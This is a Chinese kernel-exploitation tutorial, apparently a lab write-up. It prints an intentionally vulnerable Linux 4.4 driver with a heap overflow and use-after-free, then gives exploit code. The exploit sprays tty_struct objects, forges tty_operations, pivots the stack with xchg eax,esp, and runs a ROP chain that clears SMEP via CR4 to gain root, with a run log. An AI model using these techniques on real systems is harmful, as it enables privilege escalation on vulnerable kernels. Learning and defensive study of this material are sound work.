# how2kernel————第五节ROP-by-heap

> 内核版本：Linux4.4.72
>
> 文件：[heap_ROP.c](),[poc.c]()

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>栈溢出学完了绕过canary和smep后，我们接下来看看如何利用堆，Linux内核堆分配的算法用的是slub，推荐一篇经典的博客讲解slub的：[linux 内核 内存管理 slub算法 （一） 原理](https://blog.csdn.net/lukuen/article/details/6935068)。slub将内存分组分配，若不足整块大小则会向上取整，除了两个特殊的组：96（0x60）和192（0xC0）；slub分配的内存块没有用户态的malloc分配的那样有一个堆头，没有pre_size和size，内存块都是紧贴在一起的；其他slub都跟malloc差不多，做题知道这些就差不多够了。</font></br>

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>那么扯淡扯完了之后我们来看题：</font></br>

```C
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/errno.h>
#include <linux/cdev.h>
#include <asm/uaccess.h>
#include <linux/device.h>
#include<linux/slab.h>
#include<linux/string.h>

struct class *bof_class;
struct cdev cdev;
char *p;
int bof_major=248;

char *ptr[40];


struct param
{
    size_t len;
    char* buf;
    unsigned long idx;
};

long bof_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{

    struct param* p_arg;
    p_arg = (struct param*)arg;
    int retval = 0;
    switch (cmd) {
        case 9:
            copy_to_user(p_arg->buf, ptr[p_arg->idx], p_arg->len);
            printk("copy_to_user: 0x%x\n", *(long *)ptr[p_arg->idx]);
            break;
        case 8:
            copy_from_user(ptr[p_arg->idx], p_arg->buf, p_arg->len);
            break;
        case 7:
            kfree(ptr[p_arg->idx]);
            printk("free: 0x%p\n", ptr[p_arg->idx]);
            break;
        case 5:
            ptr[p_arg->idx] = kmalloc(p_arg->len, GFP_KERNEL);
            printk("alloc: 0x%p, size: %2x\n", ptr[p_arg->idx], p_arg->len);
            break;

        default:
            retval = -1;
            break;
    }

    return retval;
}

static const struct file_operations bof_fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = bof_ioctl,
};

static int bof_init(void)
{
    
    dev_t devno = MKDEV(bof_major, 0);
    int result;

    if (bof_major)
        result = register_chrdev_region(devno, 1, "bof");
    else{
        result = alloc_chrdev_region(&devno, 0, 1, "bof");
        bof_major = MAJOR(devno);
    }
    printk("bof_major /dev/bof: %d\n", bof_major);

    if (result < 0)
        return result;

    bof_class = class_create(THIS_MODULE, "bof");
    device_create(bof_class, NULL, devno, NULL, "bof");

    cdev_init(&cdev, &bof_fops);
    cdev.owner = THIS_MODULE;
    cdev_add(&cdev, devno, 1);
    return 0;
}

static void bof_exit(void)
{
    cdev_del(&cdev);
    device_destroy(bof_class, MKDEV(bof_major, 0));
    class_destroy(bof_class);
    unregister_chrdev_region(MKDEV(bof_major, 0), 1);
    printk("bof exit success\n");
}

MODULE_AUTHOR("exp_ttt");
MODULE_LICENSE("GPL");

module_init(bof_init);
module_exit(bof_exit);
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>漏洞很丰盛，无限制的堆溢出和UAF，此处我们的利用技巧是**修改tty_struct中的ops成员**来劫持流程，**ops又是一个tty_operations类型**的结构体，其中的**成员ioctl**就存放着ioctl函数的地址，我们的目标就是利用UAF修改存放着tty_struct数据的堆块，伪造ioctl函数，然后你懂的，就跟通过IO_FILE劫持差不多。</font></br>

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>linux/tty.h里有tty_struct的定义，也可以在gdb里面用p &((struct tty_struct *)0)->ops命令来看ops的偏移，可以得到是0x18：</font></br>

```C
struct tty_struct {
        int     magic;
        struct kref kref;
        struct device *dev;
        struct tty_driver *driver;
        const struct tty_operations *ops;
        int index;
//......
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>通过ioctl劫持了流程后有一个trick就是此时rax=rip，如果在这个时候执行xchg eax, esp之后就是一个栈反转，所以我们要伪造一个栈，在我们伪造的栈上放上一系列ROP指令，然后栈反转后就会按照我们的期望执行最终得到shell了，所以接下来就是流程：</font></br>

**伪造tty_operations**

```C
    unsigned long mmap_base = xchg_eax_esp & 0xffffffff;

    struct tty_operations *fake_tty_operations = (struct tty_operations *)malloc(sizeof(struct tty_operations));

    memset(fake_tty_operations, 0, sizeof(struct tty_operations));
    fake_tty_operations->ioctl = (unsigned long) xchg_eax_esp;
    fake_tty_operations->close = (unsigned long)xchg_eax_esp;

```

**伪造栈**

```C
    printf("mmap_addr: %p\n", mmap(mmap_base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0));
    unsigned long rop_chain[] = {
        pop_rdi_ret,
        0x6f0,
        rdi_to_cr4, // cr4 = 0x6f0
        mmap_base,
        (unsigned long)get_root
    };

    memcpy(mmap_base, rop_chain, sizeof(rop_chain));
```

**利用UAF劫持流程**

```C
    for (int i = 0; i < 10; ++i)
    {
        fd = open("/dev/bof", O_RDWR);
        if (fd == -1) {
            printf("open bof device failed!\n");
            return -1;
        }
        fds[i] = fd;
    }

    printf("%p\n", fake_tty_operations);
    struct param p;
    p.len = 0x2e0;
    p.buf = malloc(p.len);

    for (int i = 0; i < 10; ++i)
    {
        p.idx = i;
        ioctl(fds[i], 5, &p);  // malloc
    }

    for (int i = 2; i < 6; ++i)
    {
        p.idx = i;
        ioctl(fds[i], 7, &p); // free
    }

    // 
    for (int i = 0; i < 0x100; ++i)
    {
        ptmx_fds[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
        if (ptmx_fds[i]==-1)
        {
            printf("open ptmx err\n");
        }
    }
    p.idx = 2;
    p.len = 0x20;
    ioctl(fds[4], 9, &p);

    //
    for (int i = 0; i < 16; ++i)
    {
        printf("%2x ", p.buf[i]);
    }
    printf("\n");

    printf("fake in buf:%p\n",(unsigned long *)&p.buf[24]);
    unsigned long *temp = (unsigned long *)&p.buf[24];
    *temp = (unsigned long)fake_tty_operations;
    for (int i = 2; i < 6; ++i)
    {
        p.idx = i;
	printf("copy fake to kernel(%d)\n",i);
        ioctl(fds[4], 8, &p);
    }
    // getchar();
    for (int i = 0; i < 0x100; ++i)
    {
        ioctl(ptmx_fds[i], 0, 0);
    }

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>调试的话就会看到在do_vfs_ioctl里call ioctl时被劫持去了我们mmap的xchg eax, esp，然后继续往下执行我们的ROP指令最终拿到shell，poc的其他部分都跟stack的ROP差不多，我放在文件里自取吧，ROPgadget收集的跳板指令就不放了，自行收集吧`ROPgadget --binary vmlinux > gadget.txt`，因为我发现不同机子可能不一样，最终效果如下：</font></br>

```shell
/mytest # ./makeuser.sh 
[    3.503795] bof_major /dev/bof: 248
passwd: unknown uid 0
/mytest $ ./poc
0x1903860
mmap_addr: 0x81000000
[    4.299382] alloc: 0xffff88000240a000, size: 2e0
[    4.300876] alloc: 0xffff880002468000, size: 2e0
[    4.300997] alloc: 0xffff880002468400, size: 2e0
[    4.301071] alloc: 0xffff880002468800, size: 2e0
[    4.301144] alloc: 0xffff880002468c00, size: 2e0
[    4.301253] alloc: 0xffff880002469000, size: 2e0
[    4.301358] alloc: 0xffff880002469400, size: 2e0
[    4.301460] alloc: 0xffff880002469800, size: 2e0
[    4.301562] alloc: 0xffff880002469c00, size: 2e0
[    4.301673] alloc: 0xffff88000246a000, size: 2e0
[    4.301814] free: 0xffff880002468400
[    4.301911] free: 0xffff880002468800
[    4.301994] free: 0xffff880002468c00
[    4.302075] free: 0xffff880002469000
[    4.335180] copy_to_user: 0x5401
 1 54  0  0  1  0  0  0  0  0  0  0  0  0  0  0 
fake in buf:0x1903978
copy fake to kernel(2)
copy fake to kernel(3)
copy fake to kernel(4)
copy fake to kernel(5)
/mytest # 
```

